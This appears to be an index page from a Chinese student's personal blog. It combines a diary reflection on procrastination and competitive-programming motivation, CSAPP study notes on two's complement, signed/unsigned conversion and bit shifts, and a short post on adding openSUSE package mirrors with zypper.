<li><p>对于行动力差这一2022年第一大敌人，其实总结下来就是（1没有建立正反馈）（2对于时间的焦虑起了反作用）（3无法长时间专注）（4没有做到断舍离）当然要分析问题来讲，疾病上的问题也还是不能忽略。</p></li>
<li><p>对于太颓废其实和上面是一样的，但是回到家（大概<code>9:50</code>）没法学习这件事<strong>在继承了上面原因的基础上</strong>，还有一点就是学校和家里的环境差异。不如思考，在学校我的学习动机是什么？内卷的氛围焦虑？其实更在于一个“这是个底线绝对不能跨过去”。这个底线就是“起码在学校一定要珍惜时间”，因为这些事情搞不完早晚也要搞，以后反而更麻烦，不如现在搞了给以后省事。可以看出本来也不是什么正向的动机。唉，毕竟学文化课嘛。但还是要想着好好约束自己。实在不行以后只能把家长请来靠外力约束自己。</p></li>
<li><p>至于OI我相信我是不需要外力约束的（多亏了去年那阵子暂时退役调整对于OI的心态和看法摆正，详见博客另外文章）所以就是上述三个原因了。所以第一要建立正反馈（同时在峰值期间立刻下线到终值），另外就是要多注意一下更长时间连续的OI正反馈（大概在4h-5h单位左右
但上不封顶）；第二可以多利用番茄时钟，当然我知道不能解决完全问题，我迟早要思考一下这个问题怎么彻底根治的；第三就是断舍离咯，非常简单。不过隐隐地我感觉到有更深层次的原因在里面：大概就是因为没有正反馈，不想搞学习，然后无法长时间专注让我没法做成任何事情，然后只能闲着；然后闲着时对时间的焦虑让我不得不做些什么，所以只能颓废。逻辑大概是这样子的，一环套一环，解铃还须寄铃人，对，我是歌姬吧</p></li>
<li><p>攀比心这事是我在上学期间一次分析道的。当时大概是这样子的：我写了一些课外题感觉很有成就感，但突然感觉没有OI心理空空的，正反馈瞬间消失了（其实大概是内啡肽的调节作用，让情绪和生活状态相符合，所以说良好的心理状态是生理情绪和生活状态相适应，不然治疗抑郁症只需要打多巴胺和抗多巴胺耐受的药物就好了www）。后来这个问题是这么被分析的：这是因为我把OI当成生活中的主要部分了——那为什么文化课不能是？——因为我不喜欢文化课——但你喜欢数学——（意识到别的OIer正在搞OI而你没在搞的焦虑）——难道我学OI就是为了和别人争个高下？（我一自学的咋说也比不上别人啊…）——于是问题牵引到了“我为什么学OI这个问题上”。虽然这种问题很麻烦并且让人感觉很有一种不懂装懂的中二青年的感觉，但我当时还是犹豫把这种事情当成单纯的强迫思维症状处理还是更深入地思考人生意义（去年心理医生跟我提过存在主义，知乎上看到过虚无主义，然后就开始了自己的瞎jb思考）后来直接开摆。反正放假了，先歇会。嗯当然文化课上也有攀比，不过比不过，难受哎。</p></li>
<li><p>大概是这些
未来计划部分要针对这些进行调整和优化。期待新的一年有新的生活。不过就普遍理性而言，走不出这个高中我的精神就一天无法解放。我是没法融入这里的，一中的一切都让我恶心。</p></li>
</ul></li>
</ul>
<p><code>TODO</code> 我是谁来着？ <code>2022年1月28日</code>
凌晨<code>1:05</code> 请把书桌上绿色笔记本内容摘抄部分到下面。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://amiriox.github.io/2021/02/08/CSAPP-2021-02-08/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="amiriox">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Amiriox's Storage">
      <meta itemprop="description" content="Hey.">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | Amiriox's Storage">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/02/08/CSAPP-2021-02-08/" class="post-title-link" itemprop="url">CSAPP 2021-02-08</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2021-02-08 00:00:00" itemprop="dateCreated datePublished" datetime="2021-02-08T00:00:00+08:00">2021-02-08</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2025-02-10 14:23:20" itemprop="dateModified" datetime="2025-02-10T14:23:20+08:00">2025-02-10</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/" itemprop="url" rel="index"><span itemprop="name">组成原理</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <blockquote>
<p>此文章的 <em>撰写时间</em> 可能有误</p>
</blockquote>
<h1 id="csapp-today">CSAPP Today:</h1>
<h3 id="csapp-2.2.4专题有符号数和无符号数之间的转换">——CSAPP
2.2.4专题：有符号数和无符号数之间的转换</h3>
<p>这篇博客会更新一段时间。</p>
<hr />
<h3 id="一-有符号数转换到无符号数">一 有符号数转换到无符号数</h3>
<p>考虑如下代码（摘自CSAPP）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">short</span> <span class="type">int</span> v = <span class="number">-12345</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span> uv = (<span class="type">unsigned</span> <span class="type">short</span>) v;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;v = %d, uv=%u\n&quot;</span>, v, uv);</span><br></pre></td></tr></table></figure>
<p>在采用补码的基础上 这段代码输出 <code>v = -12345, uv = 53191</code>
观察发现-12345的补码表示和53191的无符号表示是完全一样的。
也就是说，在C语言中 有符号到无符号转换时，底层的位模式是一样的。</p>
<p>用数学化的语言描述这个规则就是：</p>
<p><span class="math display">\[T2U_w(x)=B2U_w(T2B_w(x)), (TMin_w\leq x
\leq TMax_w)\]</span></p>
<p>举个例子。<span
class="math inline">\(T2U_4(-8)=B2U_4(T2B_4(-8))=B2U_4(11111000)=\text{(截取四位)}\quad
B2U_4(1000)=8\)</span></p>
<p>还有一个简单的规律：负的有符号整数的绝对值与转换后的无符号整数之和为
<span class="math inline">\(2^w\)</span>, <span
class="math inline">\(w\)</span> 为（位模式的）位数，即 <span
class="math inline">\(|x|+T2U_w(x)=2^w， x&lt;0\)</span>
例如，上面例子中 <span
class="math inline">\(|-12345|+53191=65536=2^{16}\)</span>。这样我们可以很快速算出负的有符号数换到无符号数：<span
class="math inline">\(2^w-|x|\)</span></p>
<p>所以我们可以得到： <span class="math display">\[
\begin{equation}
T2U_w(x)=
\left\{
             \begin{array}{lr}
             x+2^w, &amp; x&lt;0 \\
             x, &amp; x\geq0
             \end{array}
\right.
\end{equation}
\]</span> ## 未完待续（这里研究了好久才勉强看懂）</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://amiriox.github.io/2021/01/31/move_to_opensuse/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="amiriox">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Amiriox's Storage">
      <meta itemprop="description" content="Hey.">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | Amiriox's Storage">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/01/31/move_to_opensuse/" class="post-title-link" itemprop="url">换了个 OpenSUSE 玩玩</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2021-01-31 00:00:00" itemprop="dateCreated datePublished" datetime="2021-01-31T00:00:00+08:00">2021-01-31</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2025-02-10 14:23:20" itemprop="dateModified" datetime="2025-02-10T14:23:20+08:00">2025-02-10</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E6%97%A5%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">日记</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <blockquote>
<p>此文章的 <em>撰写时间</em> 可能有误</p>
</blockquote>
<blockquote>
<p>upd 2024-10-02 22:56:57<br />
第一次用感觉还行，后来高三又从win换回opensuse,感觉挺垃圾的<br />
今天太晚了等明天把我那篇批判的文章迁移过来</p>
</blockquote>
<h1 id="更换到了opensuse">更换到了openSUSE</h1>
<hr />
<p>一直在考虑是否要换个linux玩玩。
自从10月1日（其实是10月2日凌晨）装好了manjaro 我就没停过折腾这玩意。</p>
<blockquote>
<p>upd 2024-10-02 22:55:45<br />
现在我在 archlinux + hyprland + neovim 迁移博客。<br />
ubuntu manjaro opensuse arch… 我的未来。</p>
</blockquote>
<p>现在从manjaro换到了openSUSE</p>
<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/yEQM5t"><img
src="https://s3.ax1x.com/2021/01/31/yEQM5t.png"
alt="yEQM5t.png" /></a></p>
<h2 id="关于换源">关于换源</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> zypper ar https://mirrors.aliyun.com/opensuse/tumbleweed/repo/oss/ ali-oss  <span class="comment"># 添加开源仓库的镜像源</span></span><br><span class="line"><span class="built_in">sudo</span> zypper ar https://mirrors.aliyun.com/opensuse/tumbleweed/repo/non-oss/ ali-noss  <span class="comment"># 添加闭源仓库的镜像源</span></span><br><span class="line"><span class="built_in">sudo</span> zypper ar https://mirrors.aliyun.com/packman/openSUSE_Tumbleweed/ ali-packman  <span class="comment"># PackMan仓库</span></span><br></pre></td></tr></table></figure>
<p>可以选择别的源 替换链接即可</p>
<p>阿里云源</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://mirrors.aliyun.com/opensuse/tumbleweed/repo/oss/</span><br><span class="line">https://mirrors.aliyun.com/opensuse/tumbleweed/repo/non-oss/</span><br><span class="line">https://mirrors.aliyun.com/packman/openSUSE_Tumbleweed/</span><br></pre></td></tr></table></figure>
<p>清华源</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://mirrors.tuna.tsinghua.edu.cn/opensuse/tumbleweed/repo/oss/</span><br><span class="line">https://mirrors.tuna.tsinghua.edu.cn/opensuse/tumbleweed/repo/non-oss/</span><br><span class="line">https://mirrors.tuna.tsinghua.edu.cn/packman/suse/openSUSE_Tumbleweed/</span><br></pre></td></tr></table></figure>
<p>中科大源</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://mirrors.ustc.edu.cn/opensuse/tumbleweed/repo/oss/</span><br><span class="line">https://mirrors.ustc.edu.cn/opensuse/tumbleweed/repo/non-oss/</span><br><span class="line">https://mirrors.ustc.edu.cn/packman/suse/openSUSE_Tumbleweed/</span><br></pre></td></tr></table></figure>
<p>美化就不说了，KDE美化教程一搜一大片</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://amiriox.github.io/2021/01/18/CSAPP-2021-01-28/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="amiriox">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Amiriox's Storage">
      <meta itemprop="description" content="Hey.">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | Amiriox's Storage">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/01/18/CSAPP-2021-01-28/" class="post-title-link" itemprop="url">CSAPP 2021-01-18</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2021-01-18 00:00:00" itemprop="dateCreated datePublished" datetime="2021-01-18T00:00:00+08:00">2021-01-18</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2025-02-10 14:23:20" itemprop="dateModified" datetime="2025-02-10T14:23:20+08:00">2025-02-10</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/" itemprop="url" rel="index"><span itemprop="name">组成原理</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <blockquote>
<p>此文章的 <em>撰写时间</em> 可能有误</p>
</blockquote>
<h1 id="csapp-today-2021-01-18">CSAPP Today 2021-01-18</h1>
<h2 id="一-左移和右移">一 左移和右移</h2>
<p>对于<code>x&lt;&lt;k</code>称为将 <span
class="math inline">\(x\)</span> 左移 <span
class="math inline">\(k\)</span> 位。 对于一个位向量表示为 <span
class="math inline">\([x_{w-1}, x_{w-2}, ..., x_0]\)</span> 的操作数
<span class="math inline">\(x\)</span>, <code>x&lt;&lt;k</code>的结果是$
[x_{w-k-1}, x_{w-k-2}, …, x_0, 0, …, 0] $ 也就是向左移动 <span
class="math inline">\(k\)</span> 位, 右侧空缺用0补齐。
在C中，左移运算符从左至右结合。即<code>x&lt;&lt;i&lt;&lt;j</code>相当于<code>(x&lt;&lt;j)&lt;&lt;k</code></p>
<p>对于<code>x&gt;&gt;k</code>成为将 <span
class="math inline">\(x\)</span> 右移 <span
class="math inline">\(k\)</span> 位。
不同的是，<strong>右移有两种形势，算术右移和逻辑右移</strong>。</p>
<h3 id="逻辑右移">1.1 逻辑右移</h3>
<p>逻辑右移与左移相对，即对于一个位向量表示为 <span
class="math inline">\([x_{w-1}, x_{w-2}, ..., x_0]\)</span> 的操作数
<span class="math inline">\(x\)</span>, <code>x&lt;&lt;k</code>的结果是
<span class="math inline">\([0, ..., 0, x_{w-1}, x_{w-2}, ...,
x_{k}]\)</span> 也就是说，向右移动 <span
class="math inline">\(k\)</span> 位，抛弃最右侧的k位，在左端补0</p>
<h3 id="算术右移">1.2 算术右移</h3>
<p>与逻辑右移不同的是，同样是抛弃最右侧k位，但<strong>在左端补原数的最高有效位</strong>，
即对于一个位向量表示为 <span class="math inline">\([x_{w-1}, x_{w-2},
..., x_0]\)</span> 的操作数 <span class="math inline">\(x\)</span>,
<code>x&lt;&lt;k</code>（算术右移）的结果是 <span
class="math inline">\([x_{w-1}, x_{w-1}, ..., x_{w-1}, x_{w-2}, ...,
x_{k}]\)</span></p>
<p>大多数C编译器使用算术右移。但对于无符号数除外，因为无符号数只能逻辑右移。
Java标准明确规定执行逻辑右移。</p>
<blockquote>
<p>Tips:</p>
<p>UB (Undefined Behavior) 是指C或C++标准并未定义的语法，
这通常意味着编译器可以在遇到ub时做任何事，比如打开一个游戏
<del>我在某个群听到说古老版本的g++碰到ub就是打开一个游戏</del></p>
<p>那么为什么要有ub呢？是因为制定标准的人没想到吗？为什么java没有ub呢？</p>
<p>大家知道C和C++是偏向底层的语言，追求速度（即便C++有OOP
模板元等特性，但也追求零开销抽象）
而对于不同情况，留下一些“漏洞”让编译器自行决定在某些特定场合
<del>比如造火箭</del> 可以追求到极致速度
而Java则没有这样的问题，毕竟JVM上的东西
就算没有GC也不可能满足某些场景下的苛刻条件的，那些场景比卡常还难</p>
</blockquote>
<p>左右移运算符优先级低。使用时请注意括号。</p>
<h2 id="二-类型转换">二 类型转换</h2>
<p>定义补码为表示 <span class="math inline">\(T\)</span>, 无符号数表示为
<span class="math inline">\(U\)</span>, 二进制数为 <span
class="math inline">\(B\)</span>, 而<code>2</code>则代表<code>to</code>
定义函数 <span class="math inline">\(U2B_w\)</span>
为无符号数到二进制数转换函数，两者都是 <span
class="math inline">\(w\)</span> 位表示的， 其他 <span
class="math inline">\(U2T_w\)</span> <span
class="math inline">\(T2B_w\)</span> 以此类推</p>
<blockquote>
<p>关于这个的理解：
虽然说叫<code>转换</code>，但实际上可以理解为<code>把...当成...看 计算出的结果</code>
比如<code>B2T</code>就是<code>把二进制看成补码，得出的结果的十进制表示</code>
这里的B代表的二进制是最基础的01位向量</p>
</blockquote>
<h3 id="无符号数-b2u">2.1 无符号数 （B2U）</h3>
<p>对于向量 $ x=[x_{w-1}, x_{w-2}, …, x_0]$ ：</p>
<p><span
class="math display">\[B2U_w(x)=\sum_{i=0}^{w-1}x_i2^i\]</span></p>
<p>这个和 OI
一些比赛初赛的二进制相关是一样的，可以手动模拟一下，没学过求和符号的可以看这个</p>
<p><span class="math display">\[U2B_4([1011])=1 \times 2^3+0 \times2^2 +
1 \times 2^1 + 1 \times 2^0=11\]</span></p>
<p>考虑 <span class="math inline">\(w\)</span>
位二进制表示的最大值和最小值。最小值当然就是0（负数的表示以后会说）
最大值即为<span class="math inline">\(\sum_{i=0}^{w-1}2^i\)</span>，
即向量每一位都是1。 根据等比数列公式易得<span
class="math inline">\(\sum_{i=0}^{w-1}2^i=2^w-1\)</span></p>
<p>函数 <span class="math inline">\(B2U_w\)</span>
是一个双射，即任意一个 <span class="math inline">\([0,2^w-1]\)</span>
的无符号数都有唯一的二进制表示， 同时每个 <span
class="math inline">\(w\)</span> 二进制表示都对应唯一一个 <span
class="math inline">\([0,2^w-1]\)</span> 的无符号数</p>
<h3 id="补码表示-b2t">2.2 补码表示 （B2T）</h3>
<p>根据补码的定义，易得以下公式（其实手动带个数进去就好了）</p>
<p><span
class="math display">\[B2T_w(x)=-x_{w-1}2^{w-1}+\sum_{i=0}^{w-2}x_{i}2^{i}\]</span></p>
<p>最高为 <span class="math inline">\(x_{w-1}\)</span>
称为符号位。如果是 <span class="math inline">\(0\)</span> 则 <span
class="math inline">\(-0=0\)</span> 所以不计（正数），如果是 <span
class="math inline">\(1\)</span> 则 <span
class="math inline">\(-1=1\)</span> 乘上 <span
class="math inline">\(2^{w-1}\)</span> 即表示负数
如果不知道这种方式为什么能表达补码 那么请看下面</p>
<p>首先我们知道补码的定义是反码加一，反码也就是最高位符号位
剩下的位都取反。 所以</p>
<p><span class="math display">\[[1011]_{2\text{补码}} =
[1010]_{2\text{反码}} = -[101]_{2} = -(1\times 2^{2}+0+1\times
2^0=-(4+1)=-5)\]</span></p>
<p>而根据上面公式</p>
<p><span class="math display">\[B2T_4([1011])=-1\times
2^{3}+\sum_{i=0}^{2}x_{i}2^{i}=-8+1\times 2^0+1\times
2^{1}+0=-8+1+2=-5\]</span></p>
<p>看明白逻辑了吗？<span class="math inline">\(B2T\)</span>
的公式实际上就是以负的为基准然后加上正的（相当于取反再取反）
而常规（按照定义算）是直接取反后加好正的然后取相反数
<del>有些大佬也可以证明一下这两个公式等价</del></p>
<p>和上面一样的推理，<span
class="math inline">\(TMax_w=2^{w-1}-1\)</span>， 而 <span
class="math inline">\(TMin_w=-2^{w-1}\)</span> 有没有感觉熟悉？ <span
class="math inline">\([-2147483648, 2147483647]\)</span> （即 <span
class="math inline">\(-2^{31}\)</span> 和 <span
class="math inline">\(2^{31}-1\)</span></p>
<p>同样，<span class="math inline">\(B2T\)</span> 也是一个双射。</p>
<blockquote>
<p>C标准并没有说有符号整数一定要用补码表示，即使大多数实现都是这样做。
Java要求采用补码表示。同时单字节数据是<code>byte</code>而不是<code>char</code>。</p>
</blockquote>
<h3 id="其他表示">2.3 其他表示</h3>
<p>我们知道除了补码 还有原码和反码。</p>
<p>反码与补码唯一的差别就是一个 <span
class="math inline">\(1\)</span>。所以只要把 <span
class="math inline">\(B2T\)</span> 公式的最高符号位改为 <span
class="math inline">\(-x_{w-1}(2^{w-1}-1)\)</span> 用 <span
class="math inline">\(O\)</span> 表示反码 (<strong>O</strong>nes’
Complement)，则</p>
<p><span
class="math display">\[B2O_w(x)=-x_{w-1}(2^{w-1}-1)+\sum_{i=0}^{w-2}x_{i}2^{i}\]</span></p>
<p>原码的公式也可以很简单地推导出来，这里不再赘述。</p>
<p>这两种表示方法的缺点是 <span class="math inline">\(0\)</span>
可以有两种表示。而且不具备补码在计算上的优势。</p>
<hr />
<h3 id="待更还有补码相关内容">待更，还有补码相关内容</h3>
<p>写在后面的话：</p>
<p>从发暂退役帖以来已经很久了 感谢大家的关心
说真的没想到有那么多人评论</p>
<p>我发现我不知道我学习OI的目标是什么，即使我在写题学算法的过程中感受到了快乐</p>
<p>但每次做不出题都会有极大挫败感
然后心里那种别扭的劲就总想让逼我更加油一点</p>
<p>而这样慢慢就变成「自己给自己下任务」了，那份纯粹的快乐也没有了</p>
<p>然后越来越焦虑，总觉得自己努力还不够 结果陷入恶性循环</p>
<hr />
<p>Manjaro KDE是真的离谱，设置上外观全没，动不动显卡驱动挂了</p>
<p>有时候调整音量那个显示在屏幕中间的音量大小图标（仿macOS的主题）
就会直接截取那个位置上显示的东西 然后还自己消失不掉
而且这个状态下放任何东西都没声，b站还是别的视频都打不开</p>
<p>点任务栏浏览器也没反应，我</p>
<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/y9oUaR"><img
src="https://s3.ax1x.com/2021/01/28/y9oUaR.png"
alt="y9oUaR.png" /></a></p>
<p>嗯， 然后过了好久才反映，这反射弧是NM离谱</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" title="下一页" aria-label="下一页" href="/page/2/"><i class="fa fa-angle-right"></i></a>
  </nav>

</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2025</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">amiriox</span>
  </div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>

  






  




  

  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"all","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
<script src="/js/third-party/math/mathjax.js"></script>



</body>
</html>
